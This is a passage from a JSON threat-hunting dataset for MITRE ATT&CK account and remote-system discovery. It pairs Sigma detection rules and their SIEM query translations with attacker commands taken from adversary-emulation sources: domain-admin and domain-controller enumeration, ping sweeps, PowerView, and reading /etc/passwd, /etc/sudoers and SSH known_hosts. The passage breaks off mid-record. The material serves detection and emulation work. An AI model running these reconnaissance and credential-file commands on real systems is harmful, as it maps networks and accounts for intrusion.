Image|endswith: \n            - '\\quser.exe'\n            - '\\qwinsta.exe'\n      - Image|endswith: '\\cmdkey.exe'\n        CommandLine|contains: '/list'\n      - Image|endswith: '\\cmd.exe'\n        CommandLine|contains|all: \n            - '/c'\n            - 'dir'\n            - '\\Users\\'\n    selection_2:\n        Image|endswith:\n            - '\\net.exe'\n            - '\\net1.exe'\n        CommandLine|contains: 'user'\n    filter:\n        CommandLine|contains:\n            - '/domain'       # local account discovery only\n            - '/add'          # discovery only\n            - '/delete'       # discovery only\n            - '/active'       # discovery only\n            - '/expires'      # discovery only\n            - '/passwordreq'  # discovery only\n            - '/scriptpath'   # discovery only\n            - '/times'        # discovery only\n            - '/workstations' # discovery only\n    condition: selection_1 or ( selection_2 and not filter )\nfields:\n    - Image\n    - CommandLine\n    - User\n    - LogonGuid\n    - Hashes\n    - ParentProcessGuid\n    - ParentCommandLine\nfalsepositives:\n     - Legitimate administrator or user enumerates local users for legitimate reason\nlevel: low\ntags:\n    - attack.discovery\n    - attack.t1033\n    - attack.t1087", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((Image.keyword:*\\\\\\\\whoami.exe OR (Image.keyword:*\\\\\\\\wmic.exe AND CommandLine.keyword:*useraccount* AND CommandLine.keyword:*get*) OR Image.keyword:(*\\\\\\\\quser.exe OR *\\\\\\\\qwinsta.exe) OR (Image.keyword:*\\\\\\\\cmdkey.exe AND CommandLine.keyword:*\\\\/list*) OR (Image.keyword:*\\\\\\\\cmd.exe AND CommandLine.keyword:*\\\\/c* AND CommandLine.keyword:*dir* AND CommandLine.keyword:*\\\\\\\\Users\\\\*)) OR ((Image.keyword:(*\\\\\\\\net.exe OR *\\\\\\\\net1.exe) AND CommandLine.keyword:*user*) AND (NOT (CommandLine.keyword:(*\\\\/domain* OR *\\\\/add* OR *\\\\/delete* OR *\\\\/active* OR *\\\\/expires* OR *\\\\/passwordreq* OR *\\\\/scriptpath* OR *\\\\/times* OR *\\\\/workstations*)))))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Local-Accounts-Discovery <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Local Accounts Discovery\",\\n    \"description\": \"Local accounts, System Owner/User discovery using operating systems utilities\",\\n    \"tags\": [\\n      \"attack.discovery\",\\n      \"attack.t1033\",\\n      \"attack.t1087\"\\n    ],\\n    \"query\": \"((Image.keyword:*\\\\\\\\\\\\\\\\whoami.exe OR (Image.keyword:*\\\\\\\\\\\\\\\\wmic.exe AND CommandLine.keyword:*useraccount* AND CommandLine.keyword:*get*) OR Image.keyword:(*\\\\\\\\\\\\\\\\quser.exe OR *\\\\\\\\\\\\\\\\qwinsta.exe) OR (Image.keyword:*\\\\\\\\\\\\\\\\cmdkey.exe AND CommandLine.keyword:*\\\\\\\\/list*) OR (Image.keyword:*\\\\\\\\\\\\\\\\cmd.exe AND CommandLine.keyword:*\\\\\\\\/c* AND CommandLine.keyword:*dir* AND CommandLine.keyword:*\\\\\\\\\\\\\\\\Users\\\\\\\\*)) OR ((Image.keyword:(*\\\\\\\\\\\\\\\\net.exe OR *\\\\\\\\\\\\\\\\net1.exe) AND CommandLine.keyword:*user*) AND (NOT (CommandLine.keyword:(*\\\\\\\\/domain* OR *\\\\\\\\/add* OR *\\\\\\\\/delete* OR *\\\\\\\\/active* OR *\\\\\\\\/expires* OR *\\\\\\\\/passwordreq* OR *\\\\\\\\/scriptpath* OR *\\\\\\\\/times* OR *\\\\\\\\/workstations*)))))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((Image.keyword:*\\\\\\\\\\\\\\\\whoami.exe OR (Image.keyword:*\\\\\\\\\\\\\\\\wmic.exe AND CommandLine.keyword:*useraccount* AND CommandLine.keyword:*get*) OR Image.keyword:(*\\\\\\\\\\\\\\\\quser.exe OR *\\\\\\\\\\\\\\\\qwinsta.exe) OR (Image.keyword:*\\\\\\\\\\\\\\\\cmdkey.exe AND CommandLine.keyword:*\\\\\\\\/list*) OR (Image.keyword:*\\\\\\\\\\\\\\\\cmd.exe AND CommandLine.keyword:*\\\\\\\\/c* AND CommandLine.keyword:*dir* AND CommandLine.keyword:*\\\\\\\\\\\\\\\\Users\\\\\\\\*)) OR ((Image.keyword:(*\\\\\\\\\\\\\\\\net.exe OR *\\\\\\\\\\\\\\\\net1.exe) AND CommandLine.keyword:*user*) AND (NOT (CommandLine.keyword:(*\\\\\\\\/domain* OR *\\\\\\\\/add* OR *\\\\\\\\/delete* OR *\\\\\\\\/active* OR *\\\\\\\\/expires* OR *\\\\\\\\/passwordreq* OR *\\\\\\\\/scriptpath* OR *\\\\\\\\/times* OR *\\\\\\\\/workstations*)))))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Local Accounts Discovery\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\n            Image = {{_source.Image}}\\\\n      CommandLine = {{_source.CommandLine}}\\\\n             User = {{_source.User}}\\\\n        LogonGuid = {{_source.LogonGuid}}\\\\n           Hashes = {{_source.Hashes}}\\\\nParentProcessGuid = {{_source.ParentProcessGuid}}\\\\nParentCommandLine = {{_source.ParentCommandLine}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((Image.keyword:*\\\\\\\\whoami.exe OR (Image.keyword:*\\\\\\\\wmic.exe AND CommandLine.keyword:*useraccount* AND CommandLine.keyword:*get*) OR Image.keyword:(*\\\\\\\\quser.exe *\\\\\\\\qwinsta.exe) OR (Image.keyword:*\\\\\\\\cmdkey.exe AND CommandLine.keyword:*\\\\/list*) OR (Image.keyword:*\\\\\\\\cmd.exe AND CommandLine.keyword:*\\\\/c* AND CommandLine.keyword:*dir* AND CommandLine.keyword:*\\\\\\\\Users\\\\*)) OR ((Image.keyword:(*\\\\\\\\net.exe *\\\\\\\\net1.exe) AND CommandLine.keyword:*user*) AND (NOT (CommandLine.keyword:(*\\\\/domain* *\\\\/add* *\\\\/delete* *\\\\/active* *\\\\/expires* *\\\\/passwordreq* *\\\\/scriptpath* *\\\\/times* *\\\\/workstations*)))))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((Image=\"*\\\\\\\\whoami.exe\" OR (Image=\"*\\\\\\\\wmic.exe\" CommandLine=\"*useraccount*\" CommandLine=\"*get*\") OR (Image=\"*\\\\\\\\quser.exe\" OR Image=\"*\\\\\\\\qwinsta.exe\") OR (Image=\"*\\\\\\\\cmdkey.exe\" CommandLine=\"*/list*\") OR (Image=\"*\\\\\\\\cmd.exe\" CommandLine=\"*/c*\" CommandLine=\"*dir*\" CommandLine=\"*\\\\\\\\Users\\\\*\")) OR (((Image=\"*\\\\\\\\net.exe\" OR Image=\"*\\\\\\\\net1.exe\") CommandLine=\"*user*\") NOT ((CommandLine=\"*/domain*\" OR CommandLine=\"*/add*\" OR CommandLine=\"*/delete*\" OR CommandLine=\"*/active*\" OR CommandLine=\"*/expires*\" OR CommandLine=\"*/passwordreq*\" OR CommandLine=\"*/scriptpath*\" OR CommandLine=\"*/times*\" OR CommandLine=\"*/workstations*\")))) | table Image,CommandLine,User,LogonGuid,Hashes,ParentProcessGuid,ParentCommandLine", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" ((Image=\"*\\\\\\\\whoami.exe\" OR (Image=\"*\\\\\\\\wmic.exe\" CommandLine=\"*useraccount*\" CommandLine=\"*get*\") OR Image IN [\"*\\\\\\\\quser.exe\", \"*\\\\\\\\qwinsta.exe\"] OR (Image=\"*\\\\\\\\cmdkey.exe\" CommandLine=\"*/list*\") OR (Image=\"*\\\\\\\\cmd.exe\" CommandLine=\"*/c*\" CommandLine=\"*dir*\" CommandLine=\"*\\\\\\\\Users\\\\*\")) OR (event_id=\"1\" (Image IN [\"*\\\\\\\\net.exe\", \"*\\\\\\\\net1.exe\"] CommandLine=\"*user*\")  -(CommandLine IN [\"*/domain*\", \"*/add*\", \"*/delete*\", \"*/active*\", \"*/expires*\", \"*/passwordreq*\", \"*/scriptpath*\", \"*/times*\", \"*/workstations*\"]))))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?:.*(?:.*(?:.*.*\\\\whoami\\\\.exe|.*(?:.*(?=.*.*\\\\wmic\\\\.exe)(?=.*.*useraccount.*)(?=.*.*get.*))|.*(?:.*.*\\\\quser\\\\.exe|.*.*\\\\qwinsta\\\\.exe)|.*(?:.*(?=.*.*\\\\cmdkey\\\\.exe)(?=.*.*/list.*))|.*(?:.*(?=.*.*\\\\cmd\\\\.exe)(?=.*.*/c.*)(?=.*.*dir.*)(?=.*.*\\\\Users\\\\.*))))|.*(?:.*(?=.*(?:.*(?=.*(?:.*.*\\\\net\\\\.exe|.*.*\\\\net1\\\\.exe))(?=.*.*user.*)))(?=.*(?!.*(?:.*(?=.*(?:.*.*/domain.*|.*.*/add.*|.*.*/delete.*|.*.*/active.*|.*.*/expires.*|.*.*/passwordreq.*|.*.*/scriptpath.*|.*.*/times.*|.*.*/workstations.*))))))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Suspicious Reconnaissance Activity\nid: d95de845-b83c-4a9a-8a6a-4fc802ebf6c0\nstatus: experimental\ndescription: Detects suspicious command line activity on Windows systems\nauthor: Florian Roth\ntags:\n    - attack.discovery\n    - attack.t1087\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine:\n            - net group \"domain admins\" /domain\n            - net localgroup administrators\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Inventory tool runs\n    - Penetration tests\n    - Administrative activity\nanalysis:\n    recommendation: Check if the user that executed the commands is suspicious (e.g. service accounts, LOCAL_SYSTEM)\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Suspicious Reconnaissance Activity\nid: d95de845-b83c-4a9a-8a6a-4fc802ebf6c0\nstatus: experimental\ndescription: Detects suspicious command line activity on Windows systems\nauthor: Florian Roth\ntags:\n    - attack.discovery\n    - attack.t1087\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine:\n            - net group \"domain admins\" /domain\n            - net localgroup administrators\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Inventory tool runs\n    - Penetration tests\n    - Administrative activity\nanalysis:\n    recommendation: Check if the user that executed the commands is suspicious (e.g. service accounts, LOCAL_SYSTEM)\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "CommandLine:(\"net\\\\ group\\\\ \\\\\"domain\\\\ admins\\\\\"\\\\ \\\\/domain\" OR \"net\\\\ localgroup\\\\ administrators\")", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Suspicious-Reconnaissance-Activity <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Suspicious Reconnaissance Activity\",\\n    \"description\": \"Detects suspicious command line activity on Windows systems\",\\n    \"tags\": [\\n      \"attack.discovery\",\\n      \"attack.t1087\"\\n    ],\\n    \"query\": \"CommandLine:(\\\\\"net\\\\\\\\ group\\\\\\\\ \\\\\\\\\\\\\"domain\\\\\\\\ admins\\\\\\\\\\\\\"\\\\\\\\ \\\\\\\\/domain\\\\\" OR \\\\\"net\\\\\\\\ localgroup\\\\\\\\ administrators\\\\\")\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"CommandLine:(\\\\\"net\\\\\\\\ group\\\\\\\\ \\\\\\\\\\\\\"domain\\\\\\\\ admins\\\\\\\\\\\\\"\\\\\\\\ \\\\\\\\/domain\\\\\" OR \\\\\"net\\\\\\\\ localgroup\\\\\\\\ administrators\\\\\")\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Suspicious Reconnaissance Activity\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\n      CommandLine = {{_source.CommandLine}}\\\\nParentCommandLine = {{_source.ParentCommandLine}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "CommandLine:(\"net group \\\\\"domain admins\\\\\" \\\\/domain\" \"net localgroup administrators\")", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(CommandLine=\"net group \\\\\"domain admins\\\\\" /domain\" OR CommandLine=\"net localgroup administrators\") | table CommandLine,ParentCommandLine", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" CommandLine IN [\"net group \\\\\"domain admins\\\\\" /domain\", \"net localgroup administrators\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P \\'^(?:.*net group \"domain admins\" /domain|.*net localgroup administrators)\\'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "index=linux sourcetype=bash_history cat /etc/passwd | table host,user_name,bash_command", "product": "Splunk", "name": null}, {"query": "index=linux sourcetype=bash_history cat /etc/sudoers | table host,user_name,bash_command", "product": "Splunk", "name": null}, {"query": "index=linux sourcetype=bash_history \"lsof -u *\" | table host,user_name,bash_command", "product": "Splunk", "name": null}, {"query": "index=linux sourcetype=bash_history lastlog | table host,user_name,bash_command", "product": "Splunk", "name": null}, {"query": "index=linux sourcetype=bash_history group OR id | table host,user_name,bash_command", "product": "Splunk", "name": null}], "possible_detections": [{"data_source": "bash_history logs"}], "attack_paths": []}, {"commands": [{"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "net group \"Domain Computers\" /domain[:DOMAIN]", "name": "Built-in Windows Command"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "net group \"Domain Computers\" /domain", "name": "Cobalt Strike"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "\npost/windows/gather/enum_ad_computers\npost/windows/gather/enum_computers", "name": "Metasploit"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "net group \"Domain Controllers\" /domain[:DOMAIN]", "name": "Built-in Windows Command"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "net group \"Domain Controllers\" /domain", "name": "Cobalt Strike"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "nltest /dclist[:domain]", "name": "Built-in Windows Command"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "echo %LOGONSERVER%", "name": "Built-in Windows Command"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "shell echo %LOGONSERVER%", "name": "Cobalt Strike"}, {"source": "atomics/T1018/T1018.yaml", "command": "net view /domain\nnet view\n", "name": null}, {"source": "atomics/T1018/T1018.yaml", "command": "net group \"Domain Computers\" /domain\n", "name": null}, {"source": "atomics/T1018/T1018.yaml", "command": "nltest.exe /dclist:domain.local\n", "name": null}, {"source": "atomics/T1018/T1018.yaml", "command": "for /l %i in (1,1,254) do ping -n 1 -w 100 192.168.1.%i\n", "name": null}, {"source": "atomics/T1018/T1018.yaml", "command": "arp -a\n", "name": null}, {"source": "atomics/T1018/T1018.yaml", "command": "arp -a | grep -v '^?'\n", "name": null}, {"source": "atomics/T1018/T1018.yaml", "command": "for ip in $(seq 1 254); do ping -c 1 192.168.1.$ip; [ $? -eq 0 ] && echo \"192.168.1.$ip UP\" || : ; done\n", "name": null}, {"source": "atomics/T1018/T1018.yaml", "command": "$localip = ((ipconfig | findstr [0-9].\\.)[0]).Split()[-1]\n$pieces = $localip.split(\".\")\n$firstOctet = $pieces[0]\n$secondOctet = $pieces[1]\n$thirdOctet = $pieces[2]\nforeach ($ip in 1..255 | % { \"$firstOctet.$secondOctet.$thirdOctet.$_\" } ) {cmd.exe /c nslookup $ip}\n", "name": null}, {"source": "data/abilities/discovery/13379ae1-d20e-4162-91f8-320d78a35e7f.yml", "command": {"windows": {"psh": {"parsers": {"plugins.stockpile.app.parsers.gdomain": [{"source": "remote.host.fqdn"}]}, "command": "Import-Module .\\powerview.ps1;\nGet-DomainComputer\n", "payload": "powerview.ps1"}}}, "name": "Use PowerView to query the Active Directory server for a list of computers in the Domain"}, {"source": "data/abilities/discovery/26c8b8b5-7b5b-4de1-a128-7d37fb14f517.yml", "command": {"windows": {"psh": {"command": "nltest /dclist:%USERDOMAIN%\n"}}}, "name": "Identify the remote domain controllers"}, {"source": "data/abilities/discovery/5f77ecf9-613f-4863-8d2f-ed6b447a4633.yml", "command": {"darwin": {"sh": {"command": "cat ~/.ssh/known_hosts\n"}}, "linux": {"sh": {"command": "cat ~/.ssh/known_hosts\n"}}}, "name": "View the known_hosts file"}, {"source": "data/abilities/discovery/85341c8c-4ecb-4579-8f53-43e3e91d7617.yml", "command": {"windows": {"psh,cmd": {"command": "arp -a"}}, "darwin": {"sh": {"command": "arp -a"}}, "linux": {"sh": {"command": "arp -a"}}}, "name": "Locate all active IP and FQDNs on the network"}, {"source": "data/abilities/discovery/b22b3b47-6219-4504-a2e6-ae8263e49fc3.yml", "command": {"windows": {"psh": {"command": "nltest /dclist:%USERDOMAIN%\n"}}}, "name": "Identify remote domain controller"}, {"source": "data/abilities/discovery/ce485320-41a4-42e8-a510-f5a8fe96a644.yml", "command": {"windows": {"psh": {"parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "target.org.emailhost"}]}, "command": "(nslookup -querytype=mx #{target.org.domain}. | Select-String -pattern 'mail' | Out-String).Trim()\n"}}, "darwin": {"sh": {"parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "target.org.emailhost"}]}, "command": "host \"#{target.org.domain}\" | grep mail | grep -oE '[^ ]+$' | rev | cut -c 2- | rev"}}, "linux": {"sh": {"parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "target.org.emailhost"}]}, "command": "host \"#{target.org.domain}\" | grep mail | grep -oE '[^ ]+$' | rev | cut -c 2- | rev"}}}, "name": "Identify the organizations mail server"}, {"source": "data/abilities/discovery/fa4ed735-7006-4451-a578-b516f80e559f.yml", "command": {"windows": {"psh": {"command": "nslookup #{remote.host.ip}\n"}}}, "name": "Find hostname of remote IP in domain"}, {"source": "data/abilities/discovery/fdf8bf36-797f-4157-805b-fe7c1c6fc903.yml", "command": {"windows": {"psh": {"command": "nbtstat -A #{remote.host.ip}"}}}, "name": "Find hostname of remote host"}, {"source": "Threat Hunting Tables", "command": "net.exe view /domain", "name": null}, {"source": "Threat Hunting Tables", "command": "qwinsta.exe /server:", "name": null}, {"source": "Threat Hunting Tables", "command": "installutil.exe /logfile= /LogToConsole=false /U *.dll", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_domain_controller", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_domain_controller", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_domain_policy", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_domain_policy", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_domain_trust", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_domain_trust", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_forest", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_forest", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_forest_domain", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_forest_domain", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_site", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_site", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/reverse_dns", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/reverse_dns", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/active_directory/get_computers", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/active_directory/get_computers", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/active_directory/get_domaincontrollers", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/active_directory/get_domaincontrollers", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/gethostbyname", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/gethostbyname", "name": "Empire Module Command"}, {"source": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "command": "Bash\nC: \\ Users \\ administrator.0DAY> net view \\\\ ICBC.0day.org\nList is empty.", "name": "Bash"}], "command_list": ["net group \"Domain Computers\" /domain[:DOMAIN]", "net group \"Domain Computers\" /domain", "\npost/windows/gather/enum_ad_computers\npost/windows/gather/enum_computers", "net group \"Domain Controllers\" /domain[:DOMAIN]", "net group \"Domain Controllers\" /domain", "nltest /dclist[:domain]", "echo %LOGONSERVER%", "shell echo %LOGONSERVER%", "net view /domain\nnet view\n", "net group \"Domain Computers\" /domain\n", "nltest.exe /dclist:domain.local\n", "for /l %i in (1,1,254) do ping -n 1 -w 100 192.168.1.%i\n", "arp -a\n", "arp -a | grep -v '^?'\n", "for ip in $(seq 1 254); do ping -c 1 192.168.1.$ip; [ $? -eq 0 ] && echo \"192.168.1.$ip UP\" || : ; done\n", "$localip = ((ipconfig | findstr [0-9].\\.)[0]).Split()[-1]\n$pieces = $localip.split(\".\")\n$firstOctet = $pieces[0]\n$secondOctet = $pieces[1]\n$thirdOctet = $pieces[2]\nforeach ($ip in 1..255 | % { \"$firstOctet.$secondOctet.$thirdOctet.$_\" } ) {cmd.exe /c nslookup $ip}\n", {"windows": {"psh": {"parsers": {"plugins.stockpile.app.parsers.gdomain": [{"source": "remote.host.fqdn"}]}, "command": "Import-Module .\\powerview.ps1;\nGet-DomainComputer\n", "payload": "powerview.ps1"}}}, {"windows": {"psh": {"command": "nltest /dclist:%USERDOMAIN%\n"}}}, {"darwin": {"sh": {"command": "cat ~/.ssh/known_hosts\n"}}, "linux": {"sh": {"command": "cat ~/.ssh/known_hosts\n"}}}, {"windows": {"psh,cmd": {"command": "arp -a"}}, "darwin": {"sh": {"command": "arp -a"}}, "linux": {"sh": {"command": "arp -a"}}}, {"windows": {"psh": {"command": "nltest /dclist:%USERDOMAIN%\n"}}}, {"windows": {"psh": {"parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "target.org.emailhost"}]}, "command": "(nslookup -querytype=mx #{target.org.domain}. | Select-String -pattern 'mail' | Out-String).Trim()\n"}}, "darwin": {"sh": {"parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "target.org.emailhost"}]}, "command": "host \"#{target.org.domain}\" | grep mail | grep -oE '[^ ]+$' | rev | cut -c 2- | rev"}}, "linux": {"sh": {"parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "target.org.emailhost"}]}, "command": "host \"#{target.org.domain}\" | grep mail | grep -oE '[^ ]+$' | rev | cut -c 2- | rev"}}}, {"windows": {"psh": {"command": "nslookup #{remote.host.ip}\n"}}}, {"windows": {"psh": {"command": "nbtstat -A #{remote.host.ip}"}}}, "net.exe view /domain", "qwinsta.exe /server:", "installutil.exe /logfile= /LogToConsole=false /U *.dll", "powershell/situational_awareness/network/powerview/get_domain_controller", "powershell/situational_awareness/network/powerview/get_domain_controller", "powershell/situational_awareness/network/powerview/get_domain_policy", "powershell/situational_awareness/network/powerview/get_domain_policy", "powershell/situational_awareness/network/powerview/get_domain_trust", "powershell/situational_awareness/network/powerview/get_domain_trust", "powershell/situational_awareness/network/powerview/get_forest", "powershell/situational_awareness/network/powerview/get_forest", "powershell/situational_awareness/network/powerview/get_forest_domain", "powershell/situational_awareness/network/powerview/get_forest_domain", "powershell/situational_awareness/network/powerview/get_site", "powershell/situational_awareness/network/powerview/get_site", "powershell/situational_awareness/network/reverse_dns", "powershell/situational_awareness/network/reverse_dns", "python/situational_awareness/network/active_directory/get_computers", "python/situational_awareness/network/active_directory/get_computers", "python/situational_awareness/network/active_directory/get_domaincontrollers", "python/situational_awareness/network/active_directory/get_domaincontrollers", "python/situational_awareness/network/gethostbyname", "python/situational_awareness/network/gethostbyname", "Bash\nC: \\ Users \\ administrator.0DAY> net view \\\\ ICBC.0day.org\nList is empty."], "technique_id": "T1018", "parsed_datasets": [{"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1018", "Built-in Windows Command": "net group \"Domain Computers\" /domain[:DOMAIN]", "Cobalt Strike": "net group \"Domain Computers\" /domain", "Description": "Display the list of domain computers in the domain by showing their computer accounts (COMP_NAME$)", "Metasploit": "\npost/windows/gather/enum_ad_computers\npost/windows/gather/enum_computers"}}, {"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1018", "Built-in Windows Command": "net group \"Domain Controllers\" /domain[:DOMAIN]", "Cobalt Strike": "net group \"Domain Controllers\" /domain", "Description": "Display the list of domain controllers in the network", "Metasploit": ""}}, {"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1018", "Built-in Windows Command": "nltest /dclist[:domain]", "Cobalt Strike": "", "Description": "Display the trust relationship between the workstation and the domain - must be elevated to use this!", "Metasploit": ""}}, {"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1018", "Built-in Windows Command": "echo %LOGONSERVER%", "Cobalt Strike": "shell echo %LOGONSERVER%", "Description": "Display the active directory login server of the workstation ", "Metasploit": ""}}, {"Atomic Red Team Test - Remote System Discovery": {"display_name": "Remote System Discovery", "atomic_tests": [{"description": "Identify remote systems with net.exe\n", "supported_platforms": ["windows"], "name": "Remote System Discovery - net", "executor": {"elevation_required": false, "command": "net view /domain\nnet view\n", "name": "command_prompt"}}, {"description": "Identify remote systems with net.exe querying the Active Directory Domain Computers group.\n", "supported_platforms": ["windows"], "name": "Remote System Discovery - net 